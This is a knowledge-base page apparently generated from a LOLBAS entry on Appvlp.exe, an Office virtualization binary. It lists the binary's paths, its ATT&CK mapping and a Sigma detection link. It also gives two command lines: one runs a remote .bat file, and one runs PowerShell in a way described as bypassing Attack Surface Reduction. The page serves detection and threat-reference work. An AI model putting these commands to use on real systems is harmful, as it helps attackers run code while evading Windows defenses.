---
title: "Appvlp.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OtherMSBinaries/Appvlp.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Appvlp.yml"
build_date: "2026-04-27 18:39:01"
category: "OtherMSBinaries"
aliases:
  - "Appvlp.exe"
functions:
  - "Execute"
attack_technique_ids:
  - "T1218"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Appvlp.exe

Application Virtualization Utility Included with Microsoft Office 2016

## Metadata

- Category: OtherMSBinaries
- Created: 2018-05-25
- Author: Oddvar Moe
- Source Path: yml/OtherMSBinaries/Appvlp.yml

## Paths

- `C:\Program Files\Microsoft Office\root\client\appvlp.exe`
- `C:\Program Files (x86)\Microsoft Office\root\client\appvlp.exe`

## Commands

### 1. Execute

Executes .bat file through AppVLP.exe

```cmd
AppVLP.exe {PATH_SMB:.bat}
```

- Use Case: Execution of BAT file hosted on Webdav server.
- Privileges: User
- Operating System: Windows 10 w/Office 2016
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]

### 2. Execute

Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.

```cmd
AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)"
```

- Use Case: Local execution of process bypassing Attack Surface Reduction (ASR).
- Privileges: User
- Operating System: Windows 10 w/Office 2016
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_appvlp.yml

## Resources

- {'Link': 'https://github.com/MoooKitty/Code-Execution'}
- {'Link': 'https://twitter.com/moo_hax/status/892388990686347264'}
- {'Link': 'https://enigma0x3.net/2018/06/11/the-tale-of-settingcontent-ms-files/'}
- {'Link': 'https://securityboulevard.com/2018/07/attackers-test-new-document-attack-vector-that-slips-past-office-defenses/'}

## Acknowledgements

- {'Person': 'fab', 'Handle': '@0rbz_'}
- {'Person': 'Will', 'Handle': '@moo_hax'}
- {'Person': 'Matt Wilson', 'Handle': '@enigma0x3'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Appvlp.yml)
